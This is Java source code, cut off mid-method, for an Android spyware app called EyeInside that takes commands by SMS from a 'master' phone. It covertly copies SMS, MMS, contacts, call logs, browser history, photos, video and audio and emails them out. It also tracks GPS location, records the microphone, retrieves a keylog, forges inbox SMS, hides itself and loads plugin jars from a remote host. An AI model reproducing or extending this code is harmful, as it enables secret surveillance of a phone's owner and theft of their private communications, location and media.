package com.code4bones.EyeInside;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract.Contacts;


import com.code4bones.utils.Mail;
import com.code4bones.utils.NetLog;

public class CommandPool {

	public static final String PACKAGE_NAME="com.code4bones.EyeInside";
	
	public boolean mInitialized = false;
	public Context mContext = null;
	public ArrayList<ContactObj> mContacts = null;
	public final SimChangeMonitor mSimChange = new SimChangeMonitor();
	public final ArrayList<CommandObj> mCommands = new ArrayList<CommandObj>();
	public final Map<String,String> mEvents = new  HashMap<String,String>();
	public final Handler mPoolHandler = new Handler();

	private static class HOLDER {
		private static final CommandPool INSTANCE = new CommandPool();
	}
	
	public CommandPool() {
	}

	public static CommandPool getInstance() {
		return HOLDER.INSTANCE;
	}
	
	public void Add(CommandObj cmd) {
		mCommands.add(cmd);
	}
	
	public void Init(Context context) {
		
		if ( mInitialized && mContext != null )
			return;
		
		mContext  = context;
		NetLog.v("Initialized %s",this);
		
		// init events names
		initEventMap();
		
		// get all contacts
		mContacts = listContacts();
		
		// set initial log counters counters
		initCounters();
	
		// sim card monitor
		mSimChange.install(mContext, new Handler() {
			public void handleMessage(Message msg) {
				SharedPreferences prefs = mContext.getSharedPreferences("prefs", 1);
				if ( prefs.contains(CommandObj.PREF_MASTER)) {
					String phone = prefs.getString(CommandObj.PREF_MASTER, "");
					if ( phone.length() > 0 ) {
						CommandObj.sendSMS(phone, "Зафиксирована смена сим карты...");
						NetLog.v("*********** SIM CHANGED ************");
					}
				}
			}
		});
		
		
		// plugins manager
		PluginManager plugins = new PluginManager(this);
		plugins.reloadPlugins();
		
		// Help command
		Add(new CommandObj(CommandObj.CMD_HELP,"[command name>]") {
			public int Invoke() throws Exception {
				String res = "";
				String help = null;
				int idx = 1;
				if ( mArgs.optCount() > 0 )
					help = mArgs.getOpt(0);
				for ( CommandObj cmd : mCommands ) {
					if ( (help != null && help.equalsIgnoreCase(cmd.mCommandName )) || help == null )
					{
						if ( res.length() != 0 ) res += "\n-\n";
						res += String.format("%2d | @%s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
						if ( help != null )
							break;
						idx++;
					}
				}
				setResult("Available %d Commands\n----\n%s",mCommands.size(),res);
				return CommandObj.ACK;
			}
		});
		
		//TODO: Commands...
		Add(new CommandObjSetup(CommandObj.CMD_SETUP,"[?][user:<login>;pass:<password>;mail:<addres,..>;smtp:<smtp>;port:<port>;[{no}wifi|any net]];[{no}silent][hide|show] - получить текущюю конфигурацию [?], или инициализировать интерфейс"));
		Add(new CommandObjGPS(CommandObj.CMD_GPS,"[time:nn][off] - получить позицию,дать nn секунд для более точного позиционирования"));
		Add(new CommandObjSpySMS(CommandObj.CMD_SPY_SMS,"[off];[mail] - мониторинг новых сообщений [отправить на мыло]"));
		Add(new CommandObjGetSMS(CommandObj.CMD_GET_SMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить смс на почту"));
		Add(new CommandObjAddSMS(CommandObj.CMD_ADD_SMS,"phone:<number>;text:<message>;[date:YYMMDDHHMM];[inbox|outbox];[read|unread] - добавить смс в базу,так как будто оно было прислано"));
		Add(new CommandObjSMS(CommandObj.CMD_SMS,"phone:<phone>;text:<message> - отправить сообщение на указанный номер"));
		Add(new CommandObjSpyMedia(CommandObj.CMD_SPY_MEDIA,"[off] - мониторинг новых видео/фото/звука"));
		Add(new CommandObjGetMedia(CommandObj.CMD_GET_MEDIA,"[video|photo|audio];[from:YYMMDD;[to:YYMMDD;]][date:YYMMDD] - получить медиа файлы на почту"));
		Add(new CommandObjSpyBook(CommandObj.CMD_SPY_BOOK,"[off] - мониторинг записной книжки"));
		Add(new CommandObjGetBook(CommandObj.CMD_GET_BOOK,"выслать всю записную книжку на почту"));
		Add(new CommandObjAddBook(CommandObj.CMD_ADD_BOOK,"name:<contact>;phone:<number>;[email:<mail>];[company:<name>]"));
		Add(new CommandObjSpyCalls(CommandObj.CMD_SPY_CALLS,"[off] - мониторинг звонков"));
		Add(new CommandObjGetCalls(CommandObj.CMD_GET_CALLS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - выслать всю историю звонков на почту"));
		Add(new CommandObjEvent(CommandObj.CMD_EVENT,"{no}[charge;boot;unlock;notify] - получать события (зарядка,загрузка,разблокировка)"));
		Add(new CommandObjGetWeb(CommandObj.CMD_GET_WEB,"[date:YYMMDD][history|bookmarks] - получить историю просмотра браузера/закладок"));
		Add(new CommandObjSpyWeb(CommandObj.CMD_SPY_WEB,"[history|bookmarks] - получать уведомления о просмотре страниц или новых закладках"));
		Add(new CommandObjGetMMS(CommandObj.CMD_GET_MMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить ММС сообщения на почту"));
		Add(new CommandObjSpyMMS(CommandObj.CMD_SPY_MMS,"Не реализовано"));
		Add(new CommandObjWhat(CommandObj.CMD_WHAT,"Получить активные мониторы (spy-команды)"));
		Add(new CommandObjMic(CommandObj.CMD_MIC,"time:nn;[off] - записывать аудио nn секунд,файл на почту"));
		Add(new CommandObjStats(CommandObj.CMD_STATS,"получить инфу о телефоне"));
		Add(new CommandObjNotify(CommandObj.CMD_NOTIFY,"text:<message> - вывести сообщение в область уведомлений"));
		Add(new CommandObjPlugin(CommandObj.CMD_PLUGIN,"[get:<http://<host>/<plugin>.jar][remove:<command or <plugin>.jar>][list]"));
		Add(new CommandObjGetKeyLog(CommandObj.CMD_GET_KEYLOG,"получить файл кейлога на почту"));
		
		//Add(new CommandObjInvoke(CommandObj.CMD_INVOKE,"[command name] [params..]"));
		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
		
		NetLog.v("Commands loaded: %d",mCommands.size());
		mInitialized = true;
	}

	//XXX Execute
	public void Execute(String phone,String message,boolean live) {
		// skip CommandObj.COMMAND_PREFIX
		message = message.trim().substring(1);
		CommandObj cmd = null;
		SharedPreferences prefs = mContext.getSharedPreferences("prefs", 1);
		boolean fSetup = prefs.getBoolean("setup", false);
		try {
			cmd = findCommand(message);
			if ( cmd == null )
				throw new Exception(String.format("Не известный запрос [%s]",message));
			
			cmd.Init(mContext,phone,message);
			
			if ( !fSetup && !cmd.mCommandName.equalsIgnoreCase(CommandObj.CMD_SETUP) && 
					        !cmd.mCommandName.equalsIgnoreCase(CommandObj.CMD_HELP) )
				throw new Exception("Командный интерфейс не инициализирован,установите параметры командой @setup[...]\n ( @? - помощь )");
			
			cmd.mLive = live;
			NetLog.v("+++ Executing %s",cmd);
			
			int resCode = cmd.Invoke();
			if ( resCode == CommandObj.REPLY )
				cmd.Reply();
			else if ( resCode == CommandObj.ACK && cmd.mLive )
				cmd.replySMS(cmd.mCommandResult);
			else if ( resCode == CommandObj.ERROR )
				throw new Exception(cmd.mCommandResult);
		} 
		catch (Exception e) {
			NetLog.v("*** CommandPool Error: %s",e.getMessage());
			CommandObj.sendSMS(phone,"Oшибка [%s]: %s", cmd!=null?cmd.mCommandName:"*",e.getMessage());
			e.printStackTrace();
		}
	}
	
	public CommandObj findCommand(Intent intent) {
		String name = intent.getAction();
		synchronized(mCommands) {
			for ( CommandObj cmd : mCommands ) {
				if ( cmd.mCommandName.equalsIgnoreCase(name) ) {
					return cmd;
				}
			}
		}
		return null;
	}
	
	
	public CommandObj findCommand(String message) {
		String name = message.toLowerCase();
		synchronized(mCommands) {
			for ( CommandObj cmd : mCommands ) {
				if ( name.startsWith(cmd.mCommandName) ) {
					return cmd;
				}
			}
		}
		return null;
	}

	
	public void invokeCommand(String fmt,Object ... args) {
		String message = String.format(fmt, args);
		SharedPreferences prefs = mContext.getSharedPreferences("prefs", 1);
		if (!prefs.contains(CommandObj.PREF_MASTER))
			return;
		CommandObj cmd = new CommandObjInvoke(CommandObj.CMD_INVOKE,"");
		cmd.Init(mContext,prefs.getString(CommandObj.PREF_MASTER, ""),CommandObj.CMD_INVOKE+" "+message);
		try {
			cmd.Invoke();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	//XXX POOL
	public void execPool(Context c) {
		
		SharedPreferences p = c.getSharedPreferences("prefs", 1);
		if ( !p.contains(CommandObj.PREF_MASTER)) {
			NetLog.v("Interface is not initialized,pool is unavailable...");
			return;
		}
		String phone = p.getString(CommandObj.PREF_MASTER, "");
		
		p = c.getSharedPreferences("commandPool", 1);
		Map<String,?> all = p.getAll();
		if ( all.size() > 0 ) {
			NetLog.v("POOL: Executing pool: %d commands",all.size());
			String commands[] = all.keySet().toArray(new String[]{});
			for ( String name : commands ) {
				//boolean delayed = p.getBoolean("delayed", false);
				String args = p.getString(name, "");
				NetLog.v("*** Pool command: %s [%s]",name,args);
				synchronized(mPoolHandler) {
					mPoolHandler.post(new CommandInvoker(c,this,phone,"@"+args,false));
				}
			}
		}
	}
	
	public void saveCommand(CommandObj cmd) {
		//NetLog.v("POOL: Saving command %s",cmd.mCommandName);
		SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
		SharedPreferences.Editor e = p.edit();
		e.putString(cmd.mCommandName,cmd.mSourceMessage);
		e.commit();
	}
	
	public void removeCommand(CommandObj cmd,boolean monitor) {
		//NetLog.v("POOL: Command removed %s",cmd.mCommandName);
		SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
		SharedPreferences.Editor e = p.edit();
		if ( p.contains(cmd.mCommandName )) {
			e.remove(cmd.mCommandName);
			if ( !monitor )
				cmd.replySMS("Появилась сеть,отложенная комманда %s выполнена", cmd.mCommandName);
		}
		e.commit();
	}
	
	
	public static long saveCount(String name,long count,boolean check) {
		SharedPreferences p = CommandPool.getInstance().mContext.getSharedPreferences("counts", 1);
		long prev = 0;
		if ( p.contains(name) )
			prev = p.getLong(name, -1);
		SharedPreferences.Editor e = p.edit();
		if ( check ) {
			if ( prev != -1 && prev != count )
				return prev;
		}
		e.putLong(name, count);
		e.commit();
		return prev;
	}
	
	public static long saveCount(String name,long count) {
		return saveCount(name,count,false);
	}
	
	public void initCounters() {
		
		Uri uris[] = new Uri[]{
				handleMedia.mUris[0],handleMedia.mUris[1],handleMedia.mUris[2],
				Uri.parse("content://sms/"),
				Contacts.CONTENT_URI,
				CallLog.Calls.CONTENT_URI,
				Browser.BOOKMARKS_URI
		};
	
		String proj[] = null;
		for ( Uri uri : uris) {
			if ( uri.equals(Browser.BOOKMARKS_URI)) {
				proj = Browser.HISTORY_PROJECTION;
			}
			Cursor cur = mContext.getContentResolver().query(uri, proj,null, null,"_id desc");
			long count = 0;
			if ( cur != null ) 
				count = cur.getCount();
			CommandPool.saveCount(uri.toString(), count,true);
		}
	}
	
	public void controlPool(CommandObj cmd,boolean save,boolean monitor) {
		if ( save )
			saveCommand(cmd);
		else 
			removeCommand(cmd,monitor);
	}
	
	
	public int checkSend(CommandObj cmd) {
		if(!cmd.canSend()) {
			cmd.mDelayed = true;
			saveCommand(cmd);
			cmd.setResult("Выполнение %s команды не возможно,нет WiFi",cmd.mCommandName);
			NetLog.v("Command saved due to internet connection lost...");
			return CommandObj.ACK;
		}
		removeCommand(cmd,false);
		return CommandObj.OK;
	}
	
	/*
	 *  Finds arbitary contact name for phone number
	 */
	ContactObj findContact(String phone) {
		final ContactObj def = new ContactObj(phone,phone);
		for (ContactObj c : mContacts ) {
			if ( c.containsPhone(phone))
				return c;
		}
		return def;
	} // findContact
	
	/*
	 *  Accesses all conatacs in the phone
	 */
	public ArrayList<ContactObj> listContacts() {
		ArrayList<ContactObj> list = new ArrayList<ContactObj>();
		Cursor cursor = mContext.getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
		if ( cursor.moveToFirst() ) {
			do {
				list.add(new ContactObj(cursor,mContext));
			} while ( cursor.moveToNext() );
			cursor.close();
		} // moveToFirst
		return list;
	}

	private void initEventMap() {
		mEvents.put("android.intent.action.BATTERY_LOW", "Низкий заряд аккумулятора");
		mEvents.put("android.intent.action.BATTERY_OKAY","Аккумулятор заряжен");
		mEvents.put("android.intent.action.ACTION_POWER_CONNECTED","Питание подключено");
		mEvents.put("android.intent.action.ACTION_POWER_DISCONNECTED","Питание отключено");
		mEvents.put("android.intent.action.BOOT_COMPLETED","Телефон только что загрузился");
		mEvents.put("android.intent.action.USER_PRESENT","Разблокировка экрана");
	}
	
	
	//
	//TODO: GPS
	//
	public class CommandObjGPS extends CommandObj implements LocationListener {
		
		public boolean mActive = false;
		private Location mLocation = null;
		
		private CommandObjGPS mGPS = null;
		private CommandObjGPS mNET = null;
		PendingIntent mPending = null;

		public CommandObjGPS(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {

			AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
			if ( locMgr == null ) {
				setResult("Возможно сервисы местоположения выключены");
				return CommandObj.ERROR;
			}

			if ( mActive ) {
				boolean off = mArgs.hasOpt("off");
				if ( !off ) {
					setResult("Команда уже выполняется,остановить выполнение можно командой @gps off");
					return CommandObj.ACK;
				} else {
					this.Reply();
					return CommandObj.OK;
				}
			}
			
			mGPS = new CommandObjGPS(mCommandName,mCommandHelp);
			mNET = new CommandObjGPS(mCommandName,mCommandHelp);
			
			locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1, 0, mNET);
			locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1, 0, mGPS);
			
			
			Intent intent = new Intent(mContext,Event_BroadcastReceiver.class);
			intent.setAction(this.mCommandName);
	
			
			mPending = PendingIntent.getBroadcast(mContext,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
			int sec = mArgs.intValue("time", 30);
			Calendar calendar = Calendar.getInstance();
			calendar.add(Calendar.SECOND, sec);
			alarm.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),mPending);
			
			mActive = true;
			setResult("Местоположение придет в %s,ждите...", calendar.getTime().toLocaleString());
			//this.replySMS(mCommandResult);
			NetLog.v("%s",mCommandResult);
			return CommandObj.ACK;
		}
		
		
		public void Reply(Object ... args) throws Exception {
			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
			if ( locMgr == null ) {
				setResult("Возможно сервисы местоположения выключены");
			}
			
			locMgr.removeUpdates(mGPS);
			locMgr.removeUpdates(mNET);
			
			
			setResult("Местоположение на %s\r\n", new Date().toLocaleString());
			
			String url = "%s | https://maps.google.ru/maps?q=%s,%s\r\n";
			
			if ( mGPS.mLocation == null ) 
				mGPS.mLocation = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
			if ( mNET.mLocation == null )
				mNET.mLocation = locMgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
			
			locationString(url,mGPS.mLocation);
			locationString(url,mNET.mLocation);
			
			NetLog.v("Location Fixed: %s",mCommandResult);
			super.Reply();
			mActive = false;
		}
		
		public void locationString(String url,Location gpsLoc) {
			if ( gpsLoc == null ) 
				mCommandResult = mCommandResult.concat("GPS | Нет данных\r\n");
		else
				mCommandResult = mCommandResult.concat(String.format(url,gpsLoc.getProvider(),
						String.format("%f", gpsLoc.getLatitude()).replace(",","."),
						String.format("%f", gpsLoc.getLongitude()).replace(",",".")));
		}
		

		@Override
		public void onLocationChanged(Location location) {
			if ( mLocation == null ) {
				mLocation = location;
			} else if ( location.hasAccuracy() && mLocation.hasAccuracy() ) {
				if ( location.getAccuracy() < mLocation.getAccuracy() )
					mLocation = location;
			} // hasAccuracy
		}

		@Override
		public void onProviderDisabled(String provider) {}
		@Override
		public void onProviderEnabled(String provider) {}
		@Override
		public void onStatusChanged(String provider, int status, Bundle extras) {}
	}// CommandObjGPS
	
	
	///////////////////////////
	//
	// TODO:SPY SMS 
	//
	public class CommandObjSpySMS extends CommandObj 
	{	
		public CommandObjSpySMS(String name, String help) {
			super(name, help);
			
		}
	
		final public HashMap<String,String> names = new HashMap<String,String>();
		
		public int Invoke() throws Exception {
			final handleSmsLog handler = new handleSmsLog(mContext);
			ContentMonitor mon = ContentMonitor.getInstance(mCommandName, mContext, this,handler); 				
			boolean enable = !mArgs.hasOpt("off");
			if ( !mon.setEnable(enable, "content://sms/") )
				return CommandObj.ERROR;
			controlPool(this,enable,true);
			return CommandObj.ACK;
		}
		
		public void Reply(Object ... argv )  throws Exception  {
			Cursor cur = (Cursor)argv[0];
			
		    long count = cur.getCount();
		    long lastCount = CommandPool.saveCount(handleSmsLog.URI.toString(), count);
		    if ( lastCount == count )
		   	   return;
		       
		    SmsObj sms = new SmsObj(cur);
		       
	       // skip command and reply messages
	        if ( CommandObj.isService(sms.message) )
		    	   return;
	        
	        if ( lastCount < count ) {
				String name = sms.phone;
				if ( names.containsKey(sms.phone) ) {
					name = names.get(sms.phone);
				} else {
					ContactObj contact = findContact(sms.phone);
					if ( contact != null ) {
						name = contact.name;
						names.put(sms.phone, name);
					}
				}
				setResult("%s '%s' : %s",sms.type == SmsObj.IN?"от":"к",name,sms.message);
	        } else {
	        	setResult("Произошло удаление СМС,было %d,стало %d",lastCount,count);
	        }
			NetLog.v("Redirecting to %s : \"%s\"\r\n",this.mMasterPhone,mCommandResult);
			if ( mArgs.hasOpt("mail") ) createMail().send();
			super.Reply();
			//this.replySMS("%s",mCommandResult);
		}
	
	} // CommandObjSMS
	
	//////////////////////
	//
	//TODO Get SMS
	//
	public class CommandObjGetSMS extends CommandObj {

		public CommandObjGetSMS(String name, String help) {
			super(name, help);
		}
		public int Invoke() throws Exception {
			
			if ( checkSend(this) == CommandObj.ACK )
				return CommandObj.ACK;
			
			final ArrayList<SmsObj> smsList = listSMS();
			
			
			String fileName = CommandObj.getFile(mContext, "sms-conv");
			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
			
			setResult("Список из %d сообщений отправлен на почту", smsList.size());
			
			ps.printf("%d messages\r\n", smsList.size());
			for ( SmsObj sms : smsList ) {
				ps.printf("%s | %s  %s | %s\r\n",sms.date,sms.type == SmsObj.IN?"from":"to  ",sms.name,sms.message);
			}
			
			ps.flush();ps.close();
			createMail().addAttachment(fileName,"sms.txt", true).send();
			
			return CommandObj.REPLY;
		}
		
		public ArrayList<SmsObj> listSMS() throws ParseException {
			
			this.makeDateParam("date",false);
			
			Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://sms//"), 
					new String[]{}, 
					mDateParam,null, "date DESC");
			if ( cursor == null ) 
				return null;
			
			final ArrayList<SmsObj> smsList = new ArrayList<SmsObj>();
			final HashMap<String,String> names = new HashMap<String,String>();

			if ( cursor.moveToFirst() ) {
				do {
					
					SmsObj sms = new SmsObj(cursor);
					String name;
					if ( names.containsKey(sms.phone)) {
						name = names.get(sms.phone);
					} else {
						ContactObj contact = findContact(sms.phone);
						name = contact == null?sms.phone:contact.name;
						names.put(sms.phone,name);
					}
					sms.name = name;
					smsList.add(sms);
				} while ( cursor.moveToNext() );
				cursor.close();
			}
			//Collections.sort(smsList);
			return smsList;
		} // listSms

	} // List SMS
	
	
	////////////
	//
	//TODO SPY Video / Image / Audio 
	//
	public class CommandObjSpyMedia extends CommandObj {

		public CommandObjSpyMedia(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			
			Integer Types[] = new Integer[]{handleMedia.VIDEO,handleMedia.IMAGE,handleMedia.AUDIO};
			String names[] = new String[]{"video","images","audio"};
			
			boolean enable = !mArgs.hasOpt("off");
			for ( Integer type : Types) {
				ContentMonitor mon = ContentMonitor.getInstance(mCommandName + names[type],mContext,this,new handleMedia(mContext,type)); 				
				if ( !mon.setEnable(enable,handleMedia.mUris[type].toString()) )
					return CommandObj.ERROR;
			}
			controlPool(this,enable,true);
			
			return CommandObj.ACK;
		}
		
		public void Reply(Object ... args) throws Exception {
			Cursor  cur = (Cursor)args[0];
	        Integer what = (Integer)args[2];
	        
	 	   long count = cur.getCount();
		   long lastCount = CommandPool.saveCount(handleMedia.mUris[what].toString(), count);
	       
		   if ( count == lastCount )
			   return;
		   
			if ( count > lastCount ) {
				String file = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnData[what]));
		        String title = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnDisp[what]));
		        //Date date = new Date(cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnDate[what])));

		        setResult("Новое %s %s",handleMedia.mTypeNames[what],title);
		        if ( canSend() ) {
			        Mail mail = createMail();
			        mail.addAttachment(file,title, false);
			        mail.setBody(mCommandResult);
			        mail.send();
		        } else {
		        	mCommandResult += " ( письмо не отправлено, нет сети...)";
		        }
			} else if ( count < lastCount ) 
				setResult("Удаление %s,было %d,стало %d",handleMedia.mTypeNames[what],lastCount,count);
	        super.Reply(args);
		}		
	}
	
	///////////////////
	//
	//XXX Get MEDIA
	//
	public class CommandObjGetMedia extends CommandObj {

		final public SimpleDateFormat mDF = new SimpleDateFormat("dd_MM_yyyy_HH_mm_ss");

		public CommandObjGetMedia(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			int type = handleMedia.IMAGE;
	
			
			if ( checkSend(this) == CommandObj.ACK )
				return CommandObj.ACK;
			
			if ( mArgs.hasOpt("video")) type = handleMedia.VIDEO;
			else if ( mArgs.hasOpt("audio")) type = handleMedia.AUDIO;
			
			String dateField = type==handleMedia.AUDIO?"date_added":"datetaken";
			
			this.makeDateParam(dateField,false);
			
			Cursor cur = mContext.getContentResolver().query(handleMedia.mUris[type], null,mDateParam, null, dateField + " DESC");
			if  (cur == null || !cur.moveToFirst() ) {
				setResult("Нет данных для %s", handleMedia.mTypeNames[type]);
				return CommandObj.ACK;
			}
			long totalSize = 0;
			Mail mail = null;
			long totalImages = cur.getCount();
			long maxSize = 1024 * 1024 * 3;
			long idx = 0;
			long lastIdx = 1;
			do {
				if ( mail == null )
					mail = createMail();
				String file = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnData[type]));
				String name = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnDisp[type]));
				long size = cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnSize[type]));
				Date date = new Date(cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnDate[type])));
				totalSize += size;
	//	        NetLog.v("Found %s ( %d ) / (total:%d, max %d)",name,size,totalSize,maxSize);
	        	mail.addAttachment(file,String.format("%s_%s",mDF.format(date),name), false);
	        	idx++;
		        if ( totalSize >= maxSize ) 
		        {
		        	setResult("%s | %d - %d из %d", handleMedia.mTypeNames[type],lastIdx,idx,totalImages);
		        	mail.setBody(mCommandResult);
		        	lastIdx = idx;
		        	mail.send();
		        	mail = null;
		        	totalSize = 0;
		        }
			} while ( cur.moveToNext() );
			cur.close();
			if ( mail != null ) {
	        	setResult("%s | %d - %d из %d", handleMedia.mTypeNames[type],lastIdx,idx,totalImages);
	        	mail.setBody(mCommandResult);
	        	mail.send();
			}
			setResult("Найдены %d %s, контент отправлен на почту", totalImages,handleMedia.mTypeNames[type]);
			return CommandObj.ACK;
		}
	} // GET MEDIA
	
	
	///////////////////
	//
	//XXX Spy Book
	//
	public class CommandObjSpyBook extends CommandObj {

		public CommandObjSpyBook(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			final handleContacts handler = new handleContacts(mContext);
			ContentMonitor mon = ContentMonitor.getInstance(mCommandName, mContext, this, handler);
			boolean enable = !mArgs.hasOpt("off");
			if (!mon.setEnable(enable, Contacts.CONTENT_URI.toString()) )
				return CommandObj.ERROR;
			controlPool(this,enable,true);
			return CommandObj.ACK;
		}
		
		public void Reply(Object ... args) throws Exception {
			Cursor cur = (Cursor)args[0];
	        ContactObj con = new ContactObj(cur,mContext);

	        // refresh phone book contacts
	        mContacts = listContacts();
	        
			long count = cur.getCount();
			long lastCount =saveCount(handleContacts.URI.toString(), count);
			
			if ( lastCount == count )
				return;
			
			if ( lastCount < count )
				setResult("Добавлен контакт: %s %s",con.name,con.phoneArray());
			else	
				setResult("Произошло удаление контакта. было %d,стало %d",lastCount,count);
			super.Reply();
		}
		
	}

	/////////////////////
	//
	//XXX Get BOOK
	//
	public class CommandObjGetBook extends CommandObj {

		public CommandObjGetBook(String name, String help) {
			super(name, help);
		}

		public int Invoke() throws Exception {
			int nCount = 1;

			if ( checkSend(this) == CommandObj.ACK )
				return CommandObj.ACK;
			
			String fileName = CommandObj.getFile(mContext, "books");
			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
			mContacts = listContacts();
			setResult("Список контактов ( %d ) отправлен на почту\t\n",mContacts.size());
			for ( ContactObj con : mContacts ) {
					String info;
					if ( con.phones.size() == 1 ) {
						info = String.format("%03d | %s : %s\r\n",nCount,con.name,con.phones.get(0));
					} else {
						info = String.format("%03d | %s\r\n",nCount,con.name);
						for ( String p : con.phones ) 
							info = info.concat(String.format("   %s\r\n",p));
					} // else
					nCount++;
					ps.print(info);
			} // for contacts
			ps.flush();ps.close();
			createMail().addAttachment(fileName,"phonebook.txt", true).send();
			return CommandObj.ACK;
		}
	} // GET BOOK

	//////////////////////
	//
	//XXX SPY CALLS
	//
	public class CommandObjSpyCalls extends CommandObj {

		public CommandObjSpyCalls(String name, String help) {
			super(name, help);
		}

		public int Invoke() throws Exception {
			final handleCallLog handler = new handleCallLog(mContext);
			
			boolean enable = !mArgs.hasOpt("off");
			ContentMonitor con = ContentMonitor.getInstance(mCommandName, mContext, this, handler);
			if ( !con.setEnable(enable, CallLog.Calls.CONTENT_URI.toString()) )
				return CommandObj.ERROR;
			controlPool(this,enable,true);
			return CommandObj.ACK;
		}
		
		public void Reply(Object ... argv) throws Exception {
			Cursor cur = (Cursor)argv[0];
			CallObj call = new CallObj(cur);
			long count = cur.getCount();
			long lastCount =saveCount(handleCallLog.URI.toString(), count);
			
			if ( lastCount == count )
				return;
			
			if ( lastCount < count )
				setResult("%s звонок %s %s / %s,%d сек.",call.type,(call.typeVal == 1||call.typeVal == 3)?"от":"на",call.phone,call.name,call.duration);
			else
				setResult("Произошло удаление звонка,было %d,стало %d",lastCount,count);
			super.Reply();
		}
		
	}
	
	
	//////////////////
	//
	//XXX Get CALLS
	//
	public class CommandObjGetCalls extends CommandObj {
		

		public CommandObjGetCalls(String name, String help) {
			super(name, help);
		}

		public int Invoke() throws Exception {
			
			if ( checkSend(this) == CommandObj.ACK )
				return ACK;
			
			this.makeDateParam("date",false);
			
			String fileName = CommandObj.getFile(mContext, "calls");
			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
			
			ArrayList<CallObj> callLog = listCalls();
			setResult("Список из %d звонков отправлен на почту\r\n", callLog.size());
			for ( CallObj call : callLog ) 
				ps.printf("%s %s %s %s  ( %d sec )\r\n",call.date,call.type,call.phone,call.name,call.duration);
			
			ps.flush();ps.close();
			
			createMail().addAttachment(fileName,"calls.txt", true).send();
			
		    return CommandObj.ACK;
		}	
		
		public ArrayList<CallObj> listCalls() throws ParseException {
		  
			Cursor cursor = mContext.getContentResolver().query(CallLog.Calls.CONTENT_URI,null, 
					mDateParam, null, "date DESC");
		    ArrayList<CallObj> callLog = new ArrayList<CallObj>();
			
		    if ( cursor == null ) 
				return null;
			
			if ( cursor.moveToFirst() ) {
				do {
					callLog.add(new CallObj(cursor));
				} while ( cursor.moveToNext() );
			}
			cursor.close();
			return callLog;
		}
	} // GET CALLS
	
	//XXX SETUP
	public class CommandObjSetup extends CommandObj {

		private SharedPreferences.Editor edit = null;

		public CommandObjSetup(String name, String help) {
			super(name, help);
		}
		
		public void read(String name,boolean opt) throws Exception {
			if ( !opt ) {
				if ( mArgs.hasArg(name) )
					 edit.putString(name, mArgs.strValue(name));
			} else {
				String noName = CommandArgs.haveNO(name);  
				if ( noName != null ) {
					if ( mArgs.hasOpt(name)) {
						edit.remove(noName);
					}
				 } else {
					boolean set = mArgs.hasOpt(name);
					if ( set )
						edit.putBoolean(name, set);
				}
			}
		}
		
		
		
		public int Invoke() throws Exception {
			SharedPreferences pref = mContext.getSharedPreferences("prefs", 1);
			//String initString = pref.getString("initString", "Интерфейс не инициализирован");
			edit = pref.edit();

			// mail
			String params[] = new String[]{
					CommandObj.PREF_MAIL_USER,
					CommandObj.PREF_MAIL_PASSWORD,
					CommandObj.PREF_MAIL_TO,
					CommandObj.PREF_MAIL_SMTP,
					CommandObj.PREF_MAIL_PORT,
			};
			
			String opts[] = new String[] {
					CommandObj.PREF_WIFI,
					CommandObj.PREF_ANY_NET,
					CommandObj.PREF_NO_WIFI,
					CommandObj.PREF_SILENT,
					CommandObj.PREF_NO_SILENT
			};
			
			if ( mArgs.hasOpt("?") ) {
				String info = this.checkSetupComplete(pref,false,";");
				if ( info == null )
					setResult("Интерфейс не инициализирован ( @help setup )");
				else 
					setResult("Строка инициализации: %s",info);
				return CommandObj.ACK;
			} 
			
			//edit.putString("initString",this.mCommandArgs);
			edit.commit();
			
			for ( String param : params )
				read(param,false);
			
			for ( String opt : opts ) 
				read(opt,true);
			
			
